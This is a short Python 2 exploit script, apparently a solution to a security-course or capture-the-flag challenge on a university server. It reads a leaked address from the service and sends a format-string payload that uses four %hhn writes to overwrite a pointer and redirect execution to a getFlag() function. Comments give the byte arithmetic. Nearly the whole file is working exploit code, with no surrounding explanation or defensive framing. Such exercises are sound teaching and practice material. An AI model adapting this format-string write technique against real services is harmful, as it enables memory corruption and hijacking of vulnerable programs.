# Echo client program
import telnetlib
import socket,sys

# The remote host
host = 'secprog.cs.nctu.edu.tw' 
port = 10105

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))


buf = s.recv(64)
if len(buf) > 0:
    sys.stdout.write(buf)
    sys.stdout.flush()

byte1 = buf[26:34].decode("hex")
print byte1.encode("hex")
byte2 = str(hex(int(byte1.encode("hex"), 16) +1)[2:-1]).decode("hex")
print byte2.encode("hex")
byte3 = str(hex(int(byte2.encode("hex"), 16) +1)[2:-1]).decode("hex")
print byte3.encode("hex")
byte4 = str(hex(int(byte3.encode("hex"), 16) +1)[2:-1]).decode("hex")
print byte4.encode("hex")

# 080486?? to 0804861D(getFlag())
# %hhn => cover one byte
# if %n we want cover 4, we can 256(0)+4-0x86(134)=126 overflow 
cover1 = "%13c%7$hhn" #1D = 16+13
cover2 = "%105c%8$hhn" #86 = 1D+69(105)
cover3 = "%126c%9$hhn" #04 = 256 + 4 = 86+7E(126)
cover4 = "%4c%10$hhn" #08 = 04+4

#s.send(byte1[::-1] + "%25c%7$hhna" + "\n")
s.send(byte1[::-1] + byte2[::-1] + byte3[::-1] + byte4[::-1] + cover1 + cover2 + cover3 + cover4 + "\n")

buf = s.recv(300)
if len(buf) > 0:
    sys.stdout.write(buf+'\n')
    sys.stdout.flush()
